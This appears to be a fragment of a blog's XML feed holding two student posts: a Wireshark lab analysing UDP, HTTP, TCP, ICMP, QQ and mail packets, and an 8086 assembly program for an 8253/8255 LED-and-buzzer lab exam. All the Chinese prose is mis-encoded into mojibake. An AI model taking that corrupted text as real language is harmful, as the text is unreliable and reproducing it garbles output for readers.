alt="P3hE11.md.png"></a><br>å†çœ‹IPå±‚çš„å†…å®¹<br><a href="https://imgchr.com/i/P3hZX6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hZX6.md.png" alt="P3hZX6.md.png"></a><br>å¯ä»¥æ¸…æ¥šåˆ†æå‡ºä»–çš„é¦–éƒ¨ä¿¡æ¯ï¼Œé¦–éƒ¨é•¿ä¸º20å­—èŠ‚ï¼Œè¿˜æœ‰æ ‡è¯†ä½5428ï¼Œ3ä½æ²¡æœ‰è®¾ç½®çš„æ ‡å¿—ä½ä»¥åŠæ€»é•¿åº¦åç§»é‡ï¼ŒTTLä¸º64ï¼Œåè®®å­—æ®µ17ï¼Œä»£è¡¨äº†ä¸Šå±‚ä½¿ç”¨UDPï¼Œä¸‹é¢å°±æ˜¯æºIPä¸º192.168.1.101ï¼Œç›®çš„IPä¸º140.207.62.105<br>å†å¾€ä¸‹åˆ†æå°±æ˜¯æ•°æ®é“¾è·¯å±‚äº†ï¼Œé‡Œé¢çš„ä¿¡æ¯ä¹Ÿå¾ˆæ¸…æ¥šï¼ŒæŠŠæºMACåœ°å€è¿˜æœ‰ç›®çš„MACåœ°å€æ˜¾ç¤ºå‡ºæ¥ï¼Œå¹¶ä¸”ä¸Šå±‚IPç±»å‹ä¸ºIPv4æºMACåœ°å€:74:c3:30:12:e6:f4,ç›®çš„MACåœ°å€:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hmnK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hmnK.md.png" alt="P3hmnK.md.png"></a></p><p><strong>httpæ•°æ®åŒ…è¯¦ç»†åˆ†æï¼š</strong><br><a href="https://imgchr.com/i/P3htnf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3htnf.md.png" alt="P3htnf.md.png"></a><br>å¯¹äºhttpæ•°æ®è¿›è¡Œåˆ†æï¼Œå‘ç°è¿˜æ˜¯ç¦»ä¸å¼€äº”å±‚åè®®ï¼Œç‰©ç†å±‚ï¼Œæ•°æ®é“¾è·¯å±‚ï¼Œç½‘è·¯å±‚ï¼Œä¼ è¾“å±‚ï¼Œè¿˜æœ‰åº”ç”¨å±‚ï¼Œå±‚æ¬¡ç»“æ„ååˆ†æ˜æ˜¾ï¼Œè¿™ä¸€æ¬¡åº”ç”¨å±‚ä»¥httpæŠ¥æ–‡æ˜¾ç¤ºï¼Œé‡Œé¢ä¼ é€’çš„çš„ä¸œè¥¿å¾ˆæ˜ç¡®ï¼Œé€šè¿‡GETæ–¹å¼è®¿é—®ç½‘ç«™èµ„æºï¼Œè®¿é—®çš„ä¸»æœºåä¸ºpub.idqqimg.com,è¿˜æœ‰å…¶ä»–çš„ä¸€äº›æµè§ˆå™¨ç›¸å…³çš„ä¿¡æ¯ç­‰ç­‰ã€‚<br><a href="https://imgchr.com/i/P3hwNQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hwNQ.md.png" alt="P3hwNQ.md.png"></a><br> ä¸‹é¢ä¸€å±‚æ˜¯TCPï¼Œå¯ä»¥çœ‹å‡ºTCPé¦–éƒ¨ä¿¡æ¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»å¦ä¸€ä¸ªæ–¹é¢æ¨å‡ºhttpåè®®ä½¿ç”¨çš„è¿è¾“å±‚åè®®æ˜¯tcpï¼Œæºç«¯å£ä¸º18122ï¼Œç›®çš„ç«¯å£ä¸º80ï¼Œè¿˜æœ‰å®ƒçš„åºå·ä»¥åŠç¡®è®¤ä¿¡å·ï¼Œè¿˜å¯ä»¥çœ‹åˆ°æ ‡å¿—ä½Flagsï¼Œçª—å£å¤§å°ä¸º32768ï¼Œé¦–éƒ¨é•¿åº¦ä¸º20ï¼Œæ£€éªŒå’Œæ˜¯0x0dfc,ç´§æ€¥æŒ‡é’ˆUrgent pointerç½®0<br> <a href="https://imgchr.com/i/P3hD9s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hD9s.md.png" alt="P3hD9s.md.png"></a><br>å†çœ‹IPå±‚çš„å†…å®¹ï¼Œå¯ä»¥æ¸…æ¥šåˆ†æå‡ºä»–çš„é¦–éƒ¨ä¿¡æ¯ï¼Œç‰ˆæœ¬å·ä¸º4ï¼Œé¦–éƒ¨é•¿ä¸º20å­—èŠ‚ï¼Œè¿˜æœ‰æ ‡è¯†633ï¼Œ3ä½æ²¡æœ‰è®¾ç½®çš„æ ‡å¿—ä½Flagsä»¥åŠæ€»é•¿åº¦åç§»é‡ï¼ŒTTLä¸º64ï¼Œåè®®å­—æ®µ6ï¼Œä»£è¡¨äº†ä¸Šå±‚ä½¿ç”¨TCPï¼Œä¸‹é¢å°±æ˜¯æºIPä¸º192.168.1.101ï¼Œç›®çš„IPä¸º157.0.149.41<br><a href="https://imgchr.com/i/P3hscq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hscq.md.png" alt="P3hscq.md.png"></a><br>åˆ†ææ•°æ®é“¾è·¯å±‚ï¼Œé‡Œé¢çš„ä¿¡æ¯ä¹Ÿå¾ˆæ¸…æ¥šï¼ŒæŠŠæºMACåœ°å€è¿˜æœ‰ç›®çš„MACåœ°å€æ˜¾ç¤ºå‡ºæ¥ï¼Œå¹¶ä¸”ä¸Šå±‚IPç±»å‹ä¸ºIPv4ï¼ŒæºMACåœ°å€:74:c3:30:12:e6:f4,ç›®çš„MACåœ°å€:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hcuV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hcuV.md.png" alt="P3hcuV.md.png"></a></p><p><strong>TCPåŒ…è¯¦ç»†åˆ†æï¼š</strong><br><a href="https://imgchr.com/i/P3h2HU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3h2HU.md.png" alt="P3h2HU.md.png"></a><br>åˆ†æTCPåŒæ ·å¯ä»¥çœ‹å‡ºTCPé¦–éƒ¨ä¿¡æ¯ï¼Œæºç«¯å£ä¸º18122ï¼Œç›®çš„ç«¯å£ä¸º80ï¼Œè¿˜æœ‰å®ƒçš„åºå·ä»¥åŠç¡®è®¤<br>ä¿¡å·ï¼Œè¿˜å¯ä»¥çœ‹åˆ°æ ‡å¿—ä½Flagsï¼Œçª—å£å¤§å°ä¸º65535ï¼Œé¦–éƒ¨é•¿åº¦ä¸º20ï¼Œæ£€éªŒå’Œæ˜¯0x16eb,ç´§æ€¥æŒ‡é’ˆUrgent pointerç½®0<br>IPå±‚çš„å†…å®¹ï¼Œå¯ä»¥æ¸…æ¥šåˆ†æå‡ºä»–çš„é¦–éƒ¨ä¿¡æ¯ï¼Œç‰ˆæœ¬å·ä¸º4ï¼Œé¦–éƒ¨é•¿ä¸º20å­—èŠ‚ï¼Œè¿˜æœ‰æ ‡è¯†631ï¼Œ3ä½æ²¡æœ‰è®¾ç½®çš„æ ‡å¿—ä½Flagsä»¥åŠæ€»é•¿åº¦åç§»é‡ï¼ŒTTLä¸º64ï¼Œåè®®å­—æ®µ6ï¼Œä»£è¡¨äº†ä¸Šå±‚ä½¿ç”¨TCPï¼Œä¸‹é¢å°±æ˜¯æºIPä¸º192.168.1.101ï¼Œç›®çš„IPä¸º157.0.149.41<br><a href="https://imgchr.com/i/P3hh4J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hh4J.md.png" alt="P3hh4J.md.png"></a></p><p>æ•°æ®é“¾è·¯å±‚ï¼Œé‡Œé¢çš„ä¿¡æ¯ä¹Ÿå¾ˆæ¸…æ¥šï¼ŒæŠŠæºMACåœ°å€è¿˜æœ‰ç›®çš„MACåœ°å€æ˜¾ç¤ºå‡ºæ¥ï¼Œå¹¶ä¸”ä¸Šå±‚IPç±»å‹ä¸ºIPv4ï¼ŒæºMACåœ°å€:74:c3:30:12:e6:f4,ç›®çš„MACåœ°å€:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3h5C9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3h5C9.md.png" alt="P3h5C9.md.png"></a></p><p><strong>ICMPåŒ…è¯¦ç»†åˆ†æï¼š</strong><br>ä½¿ç”¨icmpè¿‡æ»¤ç›¸å…³çš„æŠ¥æ–‡ï¼Œåˆ†ææ ¹æ®æŠ¥æ–‡æ ¼å¼åˆ†æicmpåŒ…é‡Œé¢çš„å†…å®¹ï¼ŒTypeæ˜¾ç¤º8è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªè¯·æ±‚æŠ¥æ–‡<br><img src="https://s1.ax1x.com/2018/07/20/P3hog1.png" alt="P3hog1.png"><br>åˆ†æç½‘ç»œå±‚å’Œæ•°æ®é“¾è·¯å±‚è·Ÿå‰é¢å‡ æ¬¡æ²¡ä»€ä¹ˆåŒºåˆ«ï¼ŒæºIPä¸º192.168.1.101ï¼Œç›®çš„IPä¸º192.168.1.100ï¼ŒIPé¦–éƒ¨ä¸º20å­—èŠ‚ï¼ŒIPç±»å‹ä¸ºIPv4ï¼ŒæºMACåœ°å€:74:c3:30:12:e6:f4,ç›®çš„MACåœ°å€:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hHu6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hHu6.md.png" alt="P3hHu6.md.png"></a><br><a href="https://imgchr.com/i/P3hbDK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hbDK.md.png" alt="P3hbDK.md.png"></a></p><p><strong>åˆ†æQQçš„æŠ¥æ–‡ï¼š</strong><br><a href="https://imgchr.com/i/P34ZCj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34ZCj.md.png" alt="P34ZCj.md.png"></a><br>å¯¹äºQQçš„åŒ…å¯ä»¥å¾—å‡ºæ¥åº”ç”¨å±‚æ˜¯ä½¿ç”¨äº†OICQçš„åè®®ï¼Œé‡Œé¢åŒ…å«äº†QQå·çš„ä¿¡æ¯ä»¥åŠåŠ å¯†è¿‡äº†çš„æ•°æ®ï¼Œä½¿ç”¨çš„æ˜¯UDPçš„ä¼ è¾“åè®®ï¼Œæºç«¯å£æ˜¯8000ï¼Œç›®çš„ç«¯å£æ˜¯4026<br>å¯¹äºç½‘ç»œå±‚ä»¥åŠæ•°æ®é“¾è·¯å±‚æ˜¯ä¸€æ ·çš„åˆ†æè¿‡ç¨‹ï¼ŒæºIPæ˜¯140.207.62.150ï¼Œç›®çš„IPæ˜¯192.168.1.101ï¼Œä¼ è¾“å±‚ä½¿ç”¨çš„æ˜¯UDPï¼ŒTTLæ˜¯55<br><a href="https://imgchr.com/i/P34m2n" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34m2n.md.png" alt="P34m2n.md.png"></a></p><p><strong>å¯¹é‚®ä»¶åŒ…åˆ†æï¼š</strong><br><a href="https://imgchr.com/i/P34nvq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34nvq.md.png" alt="P34nvq.md.png"></a><br>å¯ä»¥çœ‹å¾—å‡ºæ¥é‚®ä»¶ä¼ é€æœ‰ä¸€ä¸ªå»ºç«‹è¿æ¥çš„è¿‡ç¨‹ï¼Œä»å“ªé‡Œå‘çš„å¹¶ä¸”åœ¨å“ªé‡Œæ¥æ”¶éƒ½æœ‰å¯¹åº”çš„é‚®ç®±ï¼Œå»ºç«‹è¿æ¥çš„å¯†ç ç”¨base64åŠ å¯†è¿‡äº†ï¼Œçœ‹ä¸‹å±‚è¿è¾“å±‚æ˜¯ä½¿ç”¨TCPå»ºç«‹è¿æ¥çš„ï¼Œç›®çš„ç«¯å£æ˜¯17379ï¼Œæºç«¯å£å·25ï¼Œçª—å£å€¼138ï¼Œåºå·æ˜¯454ï¼ŒIPç‰ˆæœ¬æ˜¯IPv4ï¼ŒæºIPæ˜¯192.168.1.101ï¼Œ  ç›®çš„IPæ˜¯123.125.50.138</p><h3 id="å®éªŒå†…å®¹ç¬¬ä¸‰ç‚¹"><a href="#å®éªŒå†…å®¹ç¬¬ä¸‰ç‚¹" class="headerlink" title="å®éªŒå†…å®¹ç¬¬ä¸‰ç‚¹"></a>å®éªŒå†…å®¹ç¬¬ä¸‰ç‚¹</h3><p>è®¿é—®ç½‘ç«™<code>www.souci.li</code>,è¿‡æ»¤httpç„¶åè¿½è¸ªtcpæµå°±å¯ä»¥çœ‹è§httpåè®®å·¥ä½œçš„å¤§æ¦‚è¿‡ç¨‹(åœ¨è¿™ä¹‹å‰åº”è¯¥è¿˜å¾—é€šè¿‡DNSå»è§£æåŸŸåï¼Œä½ ä¼šå‘ç°è¿™ä¸ªåŒ…è¿‡æ»¤DNSä¼šå‘ç°æŠŠåŸŸåè½¬æ¢æˆIPçš„è¿‡ç¨‹)ï¼Œç„¶åå°±æ˜¯å°è£…httpè¯·æ±‚æ•°æ®åŒ…ï¼Œå°è£…æˆtcpåŒ…ï¼Œå»ºç«‹tcpè¿æ¥ï¼ˆä¸‰æŠ¥æ–‡æ¡æ‰‹åœ¨HTTPå·¥ä½œå¼€å§‹ ä¹‹å‰ï¼Œå®¢æˆ·æœºï¼ˆWebæµè§ˆå™¨ï¼‰é¦–å…ˆè¦é€šè¿‡ç½‘ç»œä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œè¯¥è¿æ¥æ˜¯é€šè¿‡TCPæ¥å®Œæˆçš„ï¼Œå®¢æˆ·ç«¯å‘é€è¯·æ±‚ï¼ŒæœåŠ¡å™¨å“åº”ï¼ŒæœåŠ¡å™¨å…³é—­tcpè¿æ¥<br><a href="https://imgchr.com/i/P35j1A" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P35j1A.md.png" alt="P35j1A.md.png"></a><br><a href="https://imgchr.com/i/P35v6I" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P35v6I.md.png" alt="P35v6I.md.png"></a><br>åˆ†æä¸‰æŠ¥æ–‡æ¡æ‰‹çš„è¿‡ç¨‹ï¼š<br><strong>ç¬¬ä¸€æ¬¡æŠ¥æ–‡æ¡æ‰‹</strong><br><a href="https://imgchr.com/i/P3Ip0f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Ip0f.md.png" alt="P3Ip0f.md.png"></a><br>å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªTCPï¼Œæ ‡å¿—ä½ä¸ºSYNï¼Œåºåˆ—å·ä¸º0ï¼Œ ä»£è¡¨å®¢æˆ·ç«¯è¯·æ±‚å»ºç«‹è¿æ¥</p><p><strong>ç¬¬äºŒæ¬¡æ¡æ‰‹çš„æ•°æ®åŒ…</strong><br>æœåŠ¡å™¨å‘å›ç¡®è®¤åŒ…, æ ‡å¿—ä½ä¸º SYN,ACK. å°†ç¡®è®¤åºå·(Acknowledgement Number)è®¾ç½®ä¸ºå®¢æˆ·çš„I S NåŠ 1,å³0+1=1, å¦‚ä¸‹å›¾<br><a href="https://imgchr.com/i/P3I978" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3I978.md.png" alt="P3I978.md.png"></a></p><p><strong>ç¬¬ä¸‰æ¬¡æ¡æ‰‹çš„æ•°æ®åŒ…</strong><br>å®¢æˆ·ç«¯å†æ¬¡å‘é€ç¡®è®¤åŒ…(ACK) SYNæ ‡å¿—ä½ä¸º0,ACKæ ‡å¿—ä½ä¸º1.å¹¶ä¸”æŠŠæœåŠ¡å™¨å‘æ¥ACK çš„åºå·å­—æ®µ+1,æ”¾åœ¨ç¡®å®šå­—æ®µä¸­å‘é€ç»™å¯¹æ–¹,å¦‚ä¸‹å›¾:<br><a href="https://imgchr.com/i/P3Iitg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Iitg.md.png" alt="P3Iitg.md.png"></a><br>å°±è¿™æ ·é€šè¿‡äº†TCPä¸‰æŠ¥æ–‡æ¡æ‰‹ï¼Œå»ºç«‹äº†è¿æ¥</p><p>å°å°å›é¡¾ï¼Œæ„Ÿè§‰åºŸè¯å¤ªå¤šï¼Œemmmã€‚ã€‚ã€‚</p>]]></content>
      
      <categories>
          
          <category> è®¡ç®—æœºç½‘è·¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç®—æœºç½‘è·¯ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å¾®æœºå®éªŒè€ƒè¯•</title>
      <link href="/weiji-exam.html"/>
      <url>/weiji-exam.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬ä»¥ä¸ºå¾®æœºå®éªŒä¼šå¾ˆéš¾å¾ˆéš¾(å› ä¸ºå‘¨å›´æœ‰å‡ ä¸ªåŒå­¦éƒ½è¯´æ²¡åšå®Œï¼Œemmm)ï¼Œäºæ˜¯å°±ä¸€ç›´åœ¨æœé›†å‰é¢åŒå­¦è€ƒè¿‡çš„é¢˜ç›®æ¥çœ‹ï¼Œå¤ä¹ å¾—ç¥ç»å…®å…®çš„ã€‚ã€‚ã€‚<a id="more"></a>ç»“æœæ‰‹æ°”å¤ªå¥½ï¼ŒæŠ½åˆ°ä¸€æ¡ç±»ä¼¼çš„é¢˜ç›®ï¼Œåæ­£å§ï¼Œçœ‹äº†è¿™ä¹ˆå¤šé¢˜ç›®ï¼Œæ„Ÿè§‰è¿™æœ€åçš„è€ƒè¯•å°±æ˜¯å¤§æ‚çƒ©ï¼ŒæŠŠä»¥å‰åšè¿‡çš„èŠ¯ç‰‡åšä¸ªæ’åˆ—ç»„å’Œï¼Œæ„Ÿè§‰å°±æ˜¯ä»–çš„é¢˜åº“äº†ã€‚ã€‚ã€‚å°±æ˜¯8255ï¼Œ8253ï¼Œ0832ï¼Œ0809åŠ ä¸Š4*4é”®ç›˜ï¼Œè¿˜æœ‰å„ç§å¥‡è‘©è¾“å‡ºï¼Œè¾“å‡ºåˆ°LEDï¼Œèœ‚é¸£å™¨ï¼Œç›´æµç”µåŠ¨æœºç­‰ç­‰</p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>ä¸å¤šè¯´ï¼Œå…ˆæ”¾ä¸Šä¸€æ³¢è€ƒè¯•é¢˜ç›®<br><img src="https://s1.ax1x.com/2018/07/08/Pe5shT.png" alt="Pe5shT.png"><br>æˆ‘æ¯”è¾ƒæ‡’ï¼Œå°±éšæ„è®°å½•ä¸€ä¸‹æ€è€ƒè¿‡ç¨‹å§ï¼Œç”»çš„è„‘å›¾å¤ªä¸‘ï¼Œå°±ä¸æŒ‚ä¸Šæ¥äº†<br>é¦–å…ˆè¦å®ç°ç®€å•çš„ç¡¬å»¶æ—¶è·‘é©¬ç¯ï¼Œè¿™é‡Œå°±è¦æ¶‰åŠåˆ°8253ä»¥åŠ8255ï¼Œç§»åŠ¨åˆ°ç¬¬6ä½çš„æ—¶å€™å°±è¦å¼€å¯è·³è½¬äº†ï¼Œè·³è½¬åˆ°èœ‚é¸£å™¨ï¼Œè¿™é‡Œåˆå¾—ç”¨åˆ°ä¸€æ¬¡8253å»¶æ—¶ï¼Œå“å®Œä¹‹åå°±å¾—å…³é—­ï¼Œç„¶åé‡æ–°è·³è½¬åˆ°è·‘é©¬ç¯çš„å®ç°è¿‡ç¨‹ä¸­äº†ã€‚ã€‚æ€è·¯å¾ˆæ¸…æ™°ï¼ŒLED-&gt;èœ‚é¸£å™¨-&gt;LED</p><p>äºæ˜¯åœ¨é˜Ÿå‹çš„å¸®åŠ©ä¸‹å¼€å§‹å†™ä»£ç ã€‚ã€‚ä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">CODE SEGMENT</span><br><span class="line">ASSUME CS:CODE</span><br><span class="line">START:</span><br><span class="line">MOV AL,35H     </span><br><span class="line">MOV DX,293H    ;æ§åˆ¶å£</span><br><span class="line">OUT DX,AL      ;è¾“å‡ºæ§åˆ¶å­—</span><br><span class="line">MOV AL,00H     ;ä½å­—èŠ‚</span><br><span class="line">MOV DX,290H    ;é€šé“0å£</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,20H     ;é«˜å­—èŠ‚</span><br><span class="line">OUT DX,AL</span><br><span class="line">                   ;çº§è”</span><br><span class="line">MOV AL,77H     </span><br><span class="line">MOV DX,293H    </span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,00H</span><br><span class="line">MOV DX,291H    ;é€šé“1å£</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,20H</span><br><span class="line">OUT DX,AL</span><br><span class="line"></span><br><span class="line">MOV DX,283H    ;8255æ§åˆ¶å£</span><br><span class="line">MOV AL,10010000B     </span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV BL,80H     ;åˆå§‹åŒ–</span><br><span class="line">LIGHT1:</span><br><span class="line">MOV DX,280H    ;Aå£è¾“å…¥</span><br><span class="line">IN AL,DX</span><br><span class="line">AND AX,01H     ;å’Œ00000001ä¸ä¿ç•™æœ€ä½ä½</span><br><span class="line">CMP AL,01H     ;æ¯”è¾ƒæœ€ä½ä½</span><br><span class="line">JZ DOWN       ;é«˜ç”µå¹³ä¸äº®</span><br><span class="line">MOV DX,282H    ;ä½ç”µå¹³æ—¶Cå£è¾“å‡º</span><br><span class="line">MOV AL,BL</span><br><span class="line">OUT DX,AL      ;è¾“å‡º</span><br><span class="line">TEST AL,4H      ;æ£€æµ‹æ˜¯å¦åˆ°è¾¾ç¬¬å…­ä½</span><br><span class="line">JNZ XIANG       ;æ˜¯ç¬¬å…­ä½çš„è¯å°±å“</span><br><span class="line">WAN:ROR BL,1       </span><br><span class="line">ON:</span><br><span class="line">MOV DX,280H    ;Aå£è¾“å…¥</span><br><span class="line">IN AL,DX</span><br><span class="line">AND AX,01H     </span><br><span class="line">CMP AL,01H     ;æ¯”è¾ƒæœ€ä½ä½æ˜¯å¦ä¸º1</span><br><span class="line">JNZ ON        </span><br><span class="line">DOWN:</span><br><span class="line">MOV DX,280H    ;Aå£è¾“å…¥</span><br><span class="line">IN AL,DX</span><br><span class="line">AND AX,01H</span><br><span class="line">CMP AL,0H      ;æ¯”è¾ƒæœ€ä½ä½æ˜¯å¦ä¸º0</span><br><span class="line">JNZ DOWN        </span><br><span class="line">JMP LIGHT1     ;æœ€ä½ä½ä¸º0æ—¶è·³åˆ°LIGHT1</span><br><span class="line">XIANG: MOV DX,281H</span><br><span class="line"> MOV AL,01H</span><br><span class="line">  OUT DX,AL</span><br><span class="line"> </span><br><span class="line">MOV AL,35H     </span><br><span class="line">MOV DX,293H    ;æ§åˆ¶å£</span><br><span class="line">OUT DX,AL      ;è¾“å‡ºæ§åˆ¶å­—</span><br><span class="line">MOV AL,00H     ;ä½å­—èŠ‚</span><br><span class="line">MOV DX,290H    ;é€šé“0å£</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,20H     ;é«˜å­—èŠ‚</span><br><span class="line">OUT DX,AL</span><br><span class="line">                   ;çº§è”</span><br><span class="line">MOV AL,11110001B    </span><br><span class="line">MOV DX,293H    </span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,00H</span><br><span class="line">MOV DX,291H    ;é€šé“1å£</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,10H</span><br><span class="line">OUT DX,AL</span><br><span class="line"></span><br><span class="line">CHK:MOV DX,280H</span><br><span class="line">IN AL,DX</span><br><span class="line">TEST AL,01H ;æ£€æµ‹æ˜¯å¦åˆ°è¾¾é«˜ç”µé¢‘</span><br><span class="line">JZ CHK       ;ä¸æ˜¯å°±ç»§ç»­ç›‘æµ‹ï¼Œæ˜¯å°±å…³é—­èœ‚é¸£å™¨</span><br><span class="line"> MOV AL,0H</span><br><span class="line"> MOV DX,281H</span><br><span class="line">  OUT DX,AL     </span><br><span class="line"> JMP WAN     ;ç„¶åè·³å›è·‘é©¬ç¯æ‰§è¡Œç¨‹åº</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br></pre></td></tr></table></figure></p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>å…ˆå¾—è°¢è°¢ä¸¤ä½é˜Ÿå‹çš„é¼åŠ›ç›¸åŠ©ï¼Œå› ä¸ºä»–ä»¬ï¼Œæˆ‘å®Œæˆäº†å®éªŒæŠ¥å‘Šï¼Œå› ä¸ºæœ¬äººä¸å–œæ¬¢å†™å®éªŒæŠ¥å‘Šï¼Œå“ˆå“ˆå“ˆã€‚ã€‚ã€‚<br>ä»è¿™æ¬¡è€ƒè¯•é‡Œé¢åˆåŠ æ·±ä¸€æ³¢è‡ªå·±å¯¹äº8253å·¥ä½œä¸å„ç§æ–¹å¼ä¸‹çš„åº”ç”¨ï¼Œåœ¨è¿™æ¬¡è€ƒè¯•é‡Œé¢ç¡®å®åªèƒ½ç”¨æ–¹å¼3æˆ–è€…æ˜¯æ–¹å¼0ï¼Œæ–¹å¼4æ˜¯ä¸èƒ½ç”¨çš„ï¼Œæ–¹å¼4è¿˜å¾—å¤„ç†GATEä¿¡å·ä¼šæœ‰ç‚¹éº»çƒ¦ï¼Œä¸€èˆ¬éƒ½ä¸ä¼šä½¿ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œæ¨æµ‹æœŸæœ«è€ƒè¯•å¾ˆå¤§å¯èƒ½æ€§è€ƒæ–¹å¼0ï¼Œæ–¹å¼2ä»¥åŠæ–¹å¼3ï¼Ÿå¸¸è§„æœŸæœ«è€ƒè¯•æŠ¼é¢˜å¥—è·¯ï¼ŒçŒ¥çåœ°ç¬‘äº†ã€‚ã€‚ã€‚åœ¨è¿™é‡Œæ–¹å¼2æ˜¯ä¸èƒ½ç”¨çš„ï¼Œä¼šå°‘äº†ä¸€ä¸ªCLKï¼Œè¿™è¿˜æ˜¯è€å¸ˆç­”è¾©çš„æ—¶å€™å‘ç°æˆ‘çš„é—®é¢˜ï¼Œemmmmâ€¦.<br>é¡ºä¾¿åæ§½ä¸€ä¸‹æ¯æ¬¡è·Ÿå¾®æœºè€å¸ˆäº¤æµéƒ½ä¼šå°ç´§å¼ ï¼Œè¯­é€Ÿæå…¶å¿«çš„é—®ç­”è®©æˆ‘çš„å¤§è„‘è¶…é¢‘å·¥ä½œï¼Œè¿™æ ·æ‰èƒ½è·Ÿä¸Šä»–çš„èŠ‚å¥ï¼Œè¿™ä¹Ÿä»ä¾§é¢åæ˜ äº†è‡ªå·±åŸºç¡€è¿˜æ˜¯ä¸ç‰¢é ï¼Œèµ¶ç´§æŠ“ç´§æ—¶é—´å¤ä¹ ï¼Œä¸‹å‘¨äº”å¾—è€ƒè¯•äº†</p>]]></content>
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
          <category> å¾®æœºå®éªŒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ±‡ç¼– </tag>
            
            <tag> å¾®æœºå®éªŒ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å¾®æœºå®éªŒè®°å½•</title>
      <link href="/weiji-experiment.html"/>
      <url>/weiji-experiment.html</url>
